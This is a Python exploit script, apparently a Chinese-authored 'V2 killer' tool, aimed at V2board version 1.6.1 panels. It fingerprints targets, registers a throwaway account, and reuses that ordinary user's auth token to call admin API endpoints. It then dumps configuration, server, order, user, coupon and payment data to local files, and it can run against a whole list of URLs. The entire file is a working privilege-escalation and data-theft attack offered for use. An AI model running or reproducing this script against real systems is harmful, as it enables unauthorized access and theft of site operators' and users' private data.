from urllib.parse import urlparse
from sys import exit
import argparse
import requests
import urllib3
import random
import string
import os
import re

urllib3.disable_warnings()
    
proxies = { "http": None, "https": None}


def banner():
    ascii_art = '''

____   ____________     __   .__.__  .__                
\   \ /   /\_____  \   |  | _|__|  | |  |   ___________ 
 \   Y   /  /  ____/   |  |/ /  |  | |  | _/ __ \_  __ \ 
  \     /  /       \   |    <|  |  |_|  |_\  ___/|  | \/ 
   \___/   \_______ \  |__|_ \__|____/____/\___  >__|   
                   \/       \/                 \/    
                                by: 匿名代码sec
输入 -h 查看帮助信息
'''
    print(ascii_art + '\n')


def verify(url):
    resp = requests.get(url, proxies=proxy, verify=False)
    find = re.search(r'/theme/v2board/assets/components\.chunk\.css\?v=1\.6\.1\.', resp.text)
    
    if not find:
        print(f'[-]{url} : 目标版本不受此漏洞影响！\n')
        return
    
    print(f'[+]{url} : 目标存在漏洞！尝试进行利用...')
    return True
    

def register(url):
    guest_config_api = '/api/v1/guest/comm/config'
    resp = requests.get(url + guest_config_api, proxies=proxy, verify=False).json()['data']
    
    if resp['is_email_verify'] or resp['is_invite_force']:
        print(f'[-]{url} : 目标注册需要验证邮箱，请手动利用！\n')
        return
    
    register_api = '/api/v1/passport/auth/register'
    email = ''.join(random.sample(string.ascii_letters + string.digits, 10)) + '@gmail.com'
    password = ''.join(random.sample(string.ascii_letters + string.digits, 8))
    
    post_data = {
        'email': email,
        'password': password,
    }
    
    resp = requests.post(url + register_api, data=post_data, proxies=proxy, verify=False)
    
    if '\\u672c\\u7ad9\\u5df2\\u5173\\u95ed\\u6ce8\\u518c' in resp.text:
        print(f'[-]{url} : 该站点已关闭注册，漏洞利用失败！\n')
        return
    
    if resp.status_code == 200 and resp.json()['data']:
        print(f'[+]{url} : 注册成功！当前邮箱为 {email} 密码为 {password}，尝试进行登录...')
        login(url, email, password)


def login(url, email, password):
    login_api = '/api/v1/passport/auth/login'
    data = {
        'email': email,
        'password': password,
    }
    
    resp = requests.post(url + login_api, data=data, proxies=proxy, verify=False)
    
    if resp.status_code == 200:
        auth_data = resp.json()['data']['auth_data']
        header = {'Authorization': auth_data}
        user_info_api = '/api/v1/user/info'
        requests.get(url + user_info_api, headers=header)
        print(f'[+]登录成功! header为: Authorization: {auth_data}')
        admin_api = '/api/v1/admin/config/fetch'
        resp = requests.get(url + admin_api, headers=header, proxies=proxy, verify=False)
        
        if resp.status_code == 200:
            print('[+]成功获得管理员权限!')
            print('[+]开始导出数据...')
            dump(url, header)
            
    else:
        print('[-]登录失败!\n')
        

def dump(url, header):
    data_apis = [
        '/api/v1/admin/config/fetch',
        '/api/v1/admin/plan/fetch',
        '/api/v1/admin/server/group/fetch',
        '/api/v1/admin/server/trojan/fetch',
        '/api/v1/admin/server/v2ray/fetch',
        '/api/v1/admin/server/shadowsocks/fetch',
        '/api/v1/admin/order/fetch',
        '/api/v1/admin/user/fetch',
        '/api/v1/admin/coupon/fetch',
        '/api/v1/admin/payment/fetch',
    ]
    
    dir = urlparse(url).netloc
    isExist = os.path.exists('./dump')
    if not isExist:
        os.makedirs('./dump')
    isExist = os.path.exists('./dump/' + dir)
    if not isExist:
        os.makedirs('./dump/' + dir)
    
    for api in data_apis:
        resp = requests.get(url + api, headers=header, proxies=proxy, verify=False)
        
        if resp.status_code != 200:
            print(f'[-]{api} : 接口获取失败!')
            continue
        
        if '"data":[]' in resp.text:
            print(f'[-]{api} : 该接口数据为空!')
            continue
        
        file_name = api.removeprefix('/api/v1/admin/').removesuffix('/fetch').replace('/', '-') + '.json'
        
        with open('./dump/' + dir + '/' + file_name, 'w') as f:
            f.write(resp.text)
            print(f'[+]{api} : 接口数据导出成功!')
            
    print('[+]漏洞利用成功!\n')
        

def exp(targets):
    for url in targets:
        vulnerable = verify(url)
        if vulnerable:
            register(url)

    
if __name__ == '__main__':
    banner()
    parser = argparse.ArgumentParser(description='指定目标URL或包含URL的文件')
    parser.add_argument('-u', type=str, help='目标URL')
    parser.add_argument('-l', type=str, help='包含多个URL的文件')
    args = parser.parse_args()
    
    if args.u and args.l:
        print('请输入目标URL或包含URL的文件!')
        exit()
    
    if args.u:
        url = args.u
        if url.endswith('/'):
            url = url[:-1]
        vulnerable = verify(url)
        if vulnerable:
            register(url)
            
    if args.l:
        with open(args.l) as f:
            targets = [url.strip() for url in f.readlines()]
        for url in targets:
            if url.endswith('/'):
                url = url[:-1]
            vulnerable = verify(url)
            if vulnerable:
                register(url)
